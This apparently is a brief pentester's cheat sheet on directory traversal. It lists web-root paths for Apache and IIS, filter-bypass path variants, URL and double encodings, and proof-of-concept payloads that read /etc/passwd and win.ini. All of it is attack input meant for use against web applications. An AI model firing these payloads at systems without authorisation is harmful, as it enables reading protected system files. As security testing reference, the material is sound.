# Directory Traversal
## Common Directories
- Apache 
	- `/var/www`
	- `/var/www/images`
	- `/var/www/static`
- IIS
	- `C:\inetpub\wwwroot`

## Quick Checks
- `./<PATH>`
- `/etc/passwd` `/windows/win.ini`
- `.\/<PATH>`
- `.//<PATH>`
- `.\\<PATH>`
- `....//<PATH>`
- `....\/<PATH>`
### Encodings
**Worth trying to double-encode as well**
- . -> %2e
- / ->%2f
- \ -> %5c

## System Info / POC
- Unix
	- `../[../]*/etc/passwd`
- Windows
	- `..\[..\]*\windows\win.ini`